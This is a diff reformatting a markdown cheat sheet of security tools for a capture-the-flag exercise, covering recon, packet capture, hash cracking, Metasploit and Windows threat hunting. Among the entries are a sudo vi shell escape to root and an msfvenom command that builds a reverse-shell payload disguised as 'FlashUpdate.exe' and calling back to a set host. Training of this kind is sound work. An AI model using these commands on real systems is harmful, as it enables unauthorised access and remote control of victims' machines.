@@ -111,149 +111,151 @@
 >  - `dns-brute`
 
 ### R <!-- omit in toc -->
-#### recon-ng <!-- omit in toc -->
-OSINT tool
+>#### recon-ng <!-- omit in toc -->
+>OSINT tool
 
-#### rpcclient <!-- omit in toc -->
-allows linux to send remote procedure calls to windows machines
+>#### rpcclient <!-- omit in toc -->
+>allows linux to send remote procedure calls to windows machines
 
 ### S <!-- omit in toc -->
-#### script <!-- omit in toc -->
-enables logging of the current shell
+>#### script <!-- omit in toc -->
+>enables logging of the current shell
 
-#### sed <!-- omit in toc -->
-`sed "s/somepattern/replacement/" file_or_string` replaces instances of somepattern with replacement 
+>#### sed <!-- omit in toc -->
+>`sed "s/somepattern/replacement/" file_or_string` replaces instances of somepattern with replacement 
 
-#### smbclient <!-- omit in toc -->
-allows linux to interact with windows smb
+>#### smbclient <!-- omit in toc -->
+>allows linux to interact with windows smb
 
-#### sudo <!-- omit in toc -->
-`sudo ls` "**S**uper **U**ser **DO**". Runs things as root. Commonly used to  PrivEsc.
-- `-l` lists what actions a user is allowed to run with `sudo`
+>#### sudo <!-- omit in toc -->
+>`sudo ls` "**S**uper **U**ser **DO**". Runs things as root. Commonly used to  PrivEsc.
+>- `-l` lists what actions a user is allowed to run with `sudo`
 
 ### T <!-- omit in toc -->
-#### tail <!-- omit in toc -->
-`tail somefile` prints the bottom lines of the file
-- `-1` through `-20` will print the bottom _n_ lines of the file, based on what number follows the -
+>#### tail <!-- omit in toc -->
+>`tail somefile` prints the bottom lines of the file
+>- `-1` through `-20` will print the bottom _n_ lines of the file, based on what number follows the -
 
-#### tcpdump <!-- omit in toc -->
-`sudo tcpdump -i eth0 'src host 192.168.0.1 and dst port 80'`
-It's like wireshark but for CLI. Uses Berkeley Packet Filtering. Needs sudo most of the time.
-- `-A` prints the ASCII Hex output of the packet
-- `-i` tells `tcpdump` which interface to use
-  - We should be using `TAP1` or something similar in the CTF Challenge
-  - `lo` is the loopback virtual interface
-- `-n` disables name resolution
-- `-v` enables verbose mode (more v = more verbose)
+>#### tcpdump <!-- omit in toc -->
+>`sudo tcpdump -i eth0 'src host 192.168.0.1 and dst port 80'`
+>It's like wireshark but for CLI. Uses Berkeley Packet Filtering. Needs sudo most of the time.
+>- `-A` prints the ASCII Hex output of the packet
+>- `-i` tells `tcpdump` which interface to use
+>  - We should be using `TAP1` or something similar in the CTF Challenge
+>  - `lo` is the loopback virtual interface
+>- `-n` disables name resolution
+>- `-v` enables verbose mode (more v = more verbose)
 
 ### V <!-- omit in toc -->
-#### vi <!-- omit in toc -->
-Launches the vi editor
-- not sure why you'd ever need this on your own attack platform as you should have `vim` or `nano` installed, but still useful for when you get onto pivot machines that don't have either of those and you need a command-line editor.
+>#### vi <!-- omit in toc -->
+>Launches the vi editor
+>- not sure why you'd ever need this on your own attack platform as you should have `vim` or `nano` installed, but still useful for when you get onto pivot machines that don't have either of those and you need a command-line editor.
 
-#### vim <!-- omit in toc -->
-Launches the VI Improved editor
-- I'm not good at using `vi` or `vim` so you'll have to get help from the documentation. I do know you can do a shell escape with both `vi` and `vim` by running something along the lines of:
-  - `sudo vi somefile`
-  - (once inside the editor, press `[ESC]` and run the following command:)
-  - `!/bin/bash`
+>#### vim <!-- omit in toc -->
+>Launches the VI Improved editor
+>- I'm not good at using `vi` or `vim` so you'll have to get help from the documentation. I do know you can do a shell escape with both `vi` and `vim` by running something along the lines of:
+>  - `sudo vi somefile`
+>  - (once inside the editor, press `[ESC]` and run the following command:)
+>  - `!/bin/bash`
 
 ### W <!-- omit in toc -->
-#### w <!-- omit in toc -->
-`w` prints a list of all currently logged on users and what they're doing
-#### who <!-- omit in toc -->
-`who` prints a list of all currently logged on users
-#### whois <!-- omit in toc -->
-DNS interrogation query
+>#### w <!-- omit in toc -->
+>`w` prints a list of all currently logged on users and what they're doing
+
+>#### who <!-- omit in toc -->
+>`who` prints a list of all currently logged on users
+
+>#### whois <!-- omit in toc -->
+>DNS interrogation query
 
 ### Z <!-- omit in toc -->
-#### zgrep <!-- omit in toc -->
-`zgrep 'somestring' some_compressed_file.gz` looks through a compressed file or archive to find specific text
+>#### zgrep <!-- omit in toc -->
+>`zgrep 'somestring' some_compressed_file.gz` looks through a compressed file or archive to find specific text
 
 ## Windows CLI
 
 ### C <!-- omit in toc -->
-#### certutil <!-- omit in toc -->
-`certutil -hashfile some_file MD5` calculates the MD5 hash of some_file
+>#### certutil <!-- omit in toc -->
+>`certutil -hashfile some_file MD5` calculates the MD5 hash of some_file
 
 ## D <!-- omit in toc -->
-### DeepBlue.ps1 <!-- omit in toc -->
-PowerShell Module for Threat Hunting via Windows Event Logs
-`.\DeepBlue.ps1 <event log name> <evtx filename>`
-- [Documentation](https://github.com/sans-blue-team/DeepBlueCLI)
+>### DeepBlue.ps1 <!-- omit in toc -->
+>PowerShell Module for Threat Hunting via Windows Event Logs
+>`.\DeepBlue.ps1 <event log name> <evtx filename>`
+>- [Documentation](https://github.com/sans-blue-team/DeepBlueCLI)
 
 ### N <!-- omit in toc -->
-#### net <!-- omit in toc -->
-- `net localgroup`
-  - lists all local groups
-  - `net localgroup GROUPNAME` lists info about a specific local group
-- `net use * \\path\to\network\share$`
-  - mounts network share
-- `net user`
-  - lists all users
-  - `net user USERNAME` lists info about a specific user
+>#### net <!-- omit in toc -->
+>- `net localgroup`
+>  - lists all local groups
+>  - `net localgroup GROUPNAME` lists info about a specific local group
+>- `net use * \\path\to\network\share$`
+>  - mounts network share
+>- `net user`
+>  - lists all users
+>  - `net user USERNAME` lists info about a specific user
 
-#### netstat <!-- omit in toc -->
-`netstat` shows network statistics
-- `-a` display all active TCP and UDP connections
-- `-n` do not resolve names
-- `-o` show the process id is associated with that connection
-- `-b` shows what program is associated with that connection
+>#### netstat <!-- omit in toc -->
+>`netstat` shows network statistics
+>- `-a` display all active TCP and UDP connections
+>- `-n` do not resolve names
+>- `-o` show the process id is associated with that connection
+>- `-b` shows what program is associated with that connection
 
 ### S <!-- omit in toc -->
-#### schtasks <!-- omit in toc -->
-- shows all tasks
+>#### schtasks <!-- omit in toc -->
+>- shows all tasks
 
-#### Sysinternals <!-- omit in toc -->
-These tools from the Sysinternals library run as CLI. When possible use 64bit versions.
-- Procdump
-  - Dumps info related to a specific process
-- PsExec
-  - Runs a program on a remote system, where remotely executed console
-applications execute interactively.
-- PsList
-  - Lists all processes
-- PsTree
-  - Lists all processes in Tree form, where children are nested under their parent process
-- Strings
-  - Prints strings grabbed from the executable binaries.
+>#### Sysinternals <!-- omit in toc -->
+>These tools from the Sysinternals library run as CLI. When possible use 64bit >versions.
+>- Procdump
+>  - Dumps info related to a specific process
+>- PsExec
+>  - Runs a program on a remote system, where remotely executed console
+>applications execute interactively.
+>- PsList
+>  - Lists all processes
+>- PsTree
+>  - Lists all processes in Tree form, where children are nested under their parent process
+>- Strings
+>  - Prints strings grabbed from the executable binaries.
 
 ### W <!-- omit in toc -->
-#### wmic <!-- omit in toc -->
-`wmic {WMI_TYPE} list {brief/full}` WMIC is a software utility that allows users to performs Windows Management Instrumentation (WMI) operations with a command prompt.
-- `process` gets information for all processes
-- `service` gets information for all services 
-- `where {FIELD}="{VALUE}"` simple filtering, example being:
-  - `where name=nssm.exe`
-- `list brief` short list
-- `list full` used to view more detailed info about what's being searched
-- `/node:"SERVER_NAME"` allows for connection to remote server
-- `/user:"somedomain\someuser"` lets you make the wmic request with this user account (domain is optional)
-- `/failfast:on` speeds things up when `wmic` queries fail
-
-Useful examples: 
-- `wmic process where name="FlashUpdate.exe" list full`
-- `wmic service where name="WpnUserService_5d314e6" list full`
+>#### wmic <!-- omit in toc -->
+>`wmic {WMI_TYPE} list {brief/full}` WMIC is a software utility that allows users to performs Windows Management Instrumentation (WMI) operations with a command prompt.
+>- `process` gets information for all processes
+>- `service` gets information for all services 
+>- `where {FIELD}="{VALUE}"` simple filtering, example being:
+>  - `where name=nssm.exe`
+>- `list brief` short list
+>- `list full` used to view more detailed info about what's being searched
+>- `/node:"SERVER_NAME"` allows for connection to remote server
+>- `/user:"somedomain\someuser"` lets you make the wmic request with this user account (domain is optional)
+>- `/failfast:on` speeds things up when `wmic` queries fail
+>
+>Useful examples: 
+>- `wmic process where name="FlashUpdate.exe" list full`
+>- `wmic service where name="WpnUserService_5d314e6" list full`
 
 ## OS Agnostic CLI
 
 ### H <!-- omit in toc -->
-#### hashcat <!-- omit in toc -->
-`hashcat some_file_of_hashes some_wordlist` attempts to crack the hashes using the provided wordlist
-- `-a` sets hashcat to attack mode (used when cracking passwords)
-- `-h` shows the help menu (useful for finding which hashing mode you want to use)
-- `-m` sets the hashing mode
+>#### hashcat <!-- omit in toc -->
+>`hashcat some_file_of_hashes some_wordlist` attempts to crack the hashes using the provided wordlist
+>- `-a` sets hashcat to attack mode (used when cracking passwords)
+>- `-h` shows the help menu (useful for finding which hashing mode you want to use)
+>- `-m` sets the hashing mode
 
 ### N <!-- omit in toc -->
-#### netcat <!-- omit in toc -->, ncat, nc
-`netcat 192.168.0.2 4444` makes a connection to 192.168.0.2 on port 4444
-- `-lp {PORT}` opens listener on `{PORT}`
-- `-v` turns on verbose mode
-- `-u` forces udp traffic
+>#### netcat <!-- omit in toc -->, ncat, nc
+>`netcat 192.168.0.2 4444` makes a connection to 192.168.0.2 on port 4444
+>- `-lp {PORT}` opens listener on `{PORT}`
+>- `-v` turns on verbose mode
+>- `-u` forces udp traffic
 
 ### W <!-- omit in toc -->
-#### whoami <!-- omit in toc -->
-`whoami` prints the username of whomever you're currently logged on as
+>#### whoami <!-- omit in toc -->
+>`whoami` prints the username of whomever you're currently logged on as
 
 ---
 
@@ -275,10 +277,10 @@ exploit
 
 ### msfconsole <!-- omit in toc -->
 `msfconsole` launches the console
-#### Arguments <!-- omit in toc -->
+>#### Arguments <!-- omit in toc -->
 - `-q` launch in quiet mode (slightly faster)
 
-#### Commands <!-- omit in toc -->
+>#### Commands <!-- omit in toc -->
 - `exploit` / `run`
   - attempts to run the exploit with the current options
 - `search`
@@ -293,10 +295,10 @@ exploit
   - sets the exploit
     - `use exploit/windows/smb/psexec`
 
-### meterpreter <!-- omit in toc -->
+>#### meterpreter <!-- omit in toc -->
   - `background` puts the current meterpreter session in the background
 
-#### msfvenom <!-- omit in toc -->
+>#### msfvenom <!-- omit in toc -->
 Allows for the creation of specifically packaged and targeted malware.
 - Example:
   - `msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=10.10.75.1 lport=4444 -f exe -o ./FlashUpdate.exe`
@@ -315,22 +317,22 @@ Allows for the creation of specifically packaged and targeted malware.
 # GUI Applications
 ## Linux GUI Applications
 ## B <!-- omit in toc -->
-#### BeEF <!-- omit in toc -->
+>#### BeEF <!-- omit in toc -->
 Used for website attacks. Many options and configurations
 
 ## Windows GUI Applications
 ### R <!-- omit in toc -->
-#### RegEdit <!-- omit in toc -->
+>#### RegEdit <!-- omit in toc -->
 Registry Viewer
 - `HKLM\Software\Microsoft\Windows\CurrentVersion\...`
   - `\Run` Starts the program every time someone logs in or system boots (need to figure out which)
   - `\RunOnce` Starts the program only once when someone logs in / system boots (need to figure out which) then removes this key from the registry
 
 ### S <!-- omit in toc -->
-#### Services <!-- omit in toc -->.msc
+>#### Services.msc <!-- omit in toc -->
 Service Viewer. Useful for finding malicious services based on signing and privilege level.
 
-#### Sysinternals <!-- omit in toc -->
+>#### Sysinternals <!-- omit in toc -->
 These tools from the Sysinternals library run as GUI Apps. When possible, use the 64bit versions.
 - `AutoRuns` Lists everything that starts when user logs in. BE SURE TO ENABLE WINDOWS SERVICES AND PROCESSES! 
 - `Procexp` Shows heirarchial view of all processes (Useful to see if one program spawned a child program it shouldn't)
@@ -338,12 +340,12 @@ These tools from the Sysinternals library run as GUI Apps. When possible, use th
 - `TCPView` Shows all network traffic. Useful to see if a program that shouldn't be making network connections is sending or receiving traffic 
 
 ### T <!-- omit in toc -->
-#### Task <!-- omit in toc --> Scheduler
+>#### Task Scheduler <!-- omit in toc -->
 Built-in windows task viewer. Can be used to see all the tasks and find malicious ones.
 
 ## OS Agnostic GUI Applications
 ### S <!-- omit in toc -->
-#### Spiderfoot <!-- omit in toc -->
+>#### Spiderfoot <!-- omit in toc -->
 OSINT tool (WebAPP). Might not be used in CTF but still useful.
 
 ---
